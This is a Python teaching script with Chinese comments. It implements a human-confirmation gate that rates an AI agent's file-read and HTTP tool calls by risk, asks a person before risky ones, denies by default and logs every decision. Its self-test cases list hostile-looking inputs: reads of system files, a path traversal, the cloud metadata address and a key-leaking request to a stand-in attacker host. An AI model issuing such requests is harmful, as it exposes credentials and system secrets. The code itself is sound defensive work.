# -*- coding: utf-8 -*-
"""
guard.py —— 人工确认闸门（D6-5）

**可以直接运行，看它怎么判断：**
    python guard.py

核心思想：确认必须发生在「执行之前」，而且必须看得懂。

四条原则：
    1. 在宿主层拦，不在 prompt 里拦
    2. 确认「参数」，不是确认「工具名」——read_file 不危险，read_file('/etc/passwd') 才危险
    3. 分级：低风险自动放行，高风险才问。否则用户会疲劳，最后闭眼点「允许」
    4. 默认拒绝：看不懂、超时、没输入 → 一律拒绝

接入 agent_rag.py（已经接好了，用开关控制）：
    python agent_rag.py            # 裸奔版
    python agent_rag.py --guard    # 开启确认闸门
"""
import os
import urllib.parse
from datetime import datetime

HERE = os.path.dirname(os.path.abspath(__file__))
AUDIT_LOG = os.path.join(HERE, "audit.log")

# ↓↓↓ 这两行就是你要自己定义的"安全边界"
ALLOWED_DIRS = {HERE}                    # read_file 只允许读这个目录
ALLOWED_HOSTS = {"example.com"}          # http_get 只允许访问这些域名


def _resolve(p):
    return p if os.path.isabs(p) else os.path.normpath(os.path.join(HERE, p))


def _host(url):
    try:
        return urllib.parse.urlparse(url).hostname or ""
    except Exception:
        return ""


def describe(name, args):
    """把工具调用翻译成人话——确认框里要显示这个，不是显示 JSON。"""
    if name == "list_files":
        return f"列出目录：{_resolve(args.get('dir', '.'))}"
    if name == "read_file":
        p = _resolve(args.get("path", ""))
        return f"读取文件：{p}"
    if name == "http_get":
        u = args.get("url", "")
        return f"发起网络请求：\n     {u}\n     目标主机：{_host(u) or '（无法解析）'}"
    return f"调用未知工具：{name} {args}"


def risk(name, args):
    """low = 自动放行；high = 必须人工确认。"""
    if name == "list_files":
        p = _resolve(args.get("dir", "."))
        return "low" if any(p.startswith(d) for d in ALLOWED_DIRS) else "high"

    if name == "read_file":
        p = _resolve(args.get("path", ""))
        inside = any(p.startswith(d) for d in ALLOWED_DIRS)
        return "low" if inside and os.path.isfile(p) else "high"

    if name == "http_get":
        return "low" if _host(args.get("url", "")) in ALLOWED_HOSTS else "high"

    return "high"          # 未知工具一律 high


def _audit(name, args, decision):
    line = (f"{datetime.now().isoformat(timespec='seconds')}\t"
            f"{decision}\t{name}\t{args}\n")
    with open(AUDIT_LOG, "a", encoding="utf-8") as f:
        f.write(line)


def gate(name, args, assume_no=False):
    """返回 (是否允许, 原因)。"""
    level = risk(name, args)

    if level == "low":
        _audit(name, args, "AUTO_ALLOW")
        return True, "低风险，自动放行"

    print("\n" + "─" * 56)
    print("⚠️  需要人工确认")
    print("   " + describe(name, args).replace("\n", "\n   "))
    print("─" * 56)

    if assume_no:                       # 无人值守场景：一律拒绝
        _audit(name, args, "DENY_NO_OPERATOR")
        print("   → 无操作员，默认拒绝")
        return False, "无人确认"

    try:
        ans = input("   允许执行？[y/N] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        ans = ""

    if ans in {"y", "yes"}:
        _audit(name, args, "HUMAN_ALLOW")
        return True, "人工批准"

    _audit(name, args, "HUMAN_DENY")
    print("   → 已拒绝")
    return False, "人工拒绝"


# ────────────────────────────── 自测
def main():
    print("=" * 62)
    print("① 风险分级（只判定，不询问）")
    print("=" * 62)
    cases = [
        ("list_files", {"dir": "./"}, "列自己的目录"),
        ("read_file", {"path": "secret.txt"}, "读本目录文件"),
        ("read_file", {"path": "C:/Windows/win.ini"}, "读系统文件"),
        ("read_file", {"path": "../../W1/03_参考资料/知识库.txt"}, "读别的项目"),
        ("http_get", {"url": "http://example.com/x"}, "访问白名单域名"),
        ("http_get", {"url": "http://169.254.169.254/latest/meta-data/"}, "访问云元数据"),
        ("http_get", {"url": "http://evil.example.net/x?d=key"}, "访问外部域名"),
    ]
    for name, args, note in cases:
        lvl = risk(name, args)
        tag = "自动放行" if lvl == "low" else "需要确认"
        print(f"  [{lvl:<4}] {tag}  ← {note}")

    print()
    print("=" * 62)
    print("② 交互演示（输入 y 批准，其余键拒绝）")
    print("=" * 62)

    print("\n>>> 场景 A：低风险，不问你，直接过")
    ok, reason = gate("read_file", {"path": "secret.txt"})
    print(f"    结果：{'允许' if ok else '拒绝'}（{reason}）")

    print("\n>>> 场景 B：高风险，弹窗等你决定")
    ok, reason = gate("read_file", {"path": "C:/Windows/win.ini"})
    print(f"    结果：{'允许' if ok else '拒绝'}（{reason}）")

    print(f"\n审计日志已写入：{AUDIT_LOG}")
    print("=" * 62)


if __name__ == "__main__":
    main()


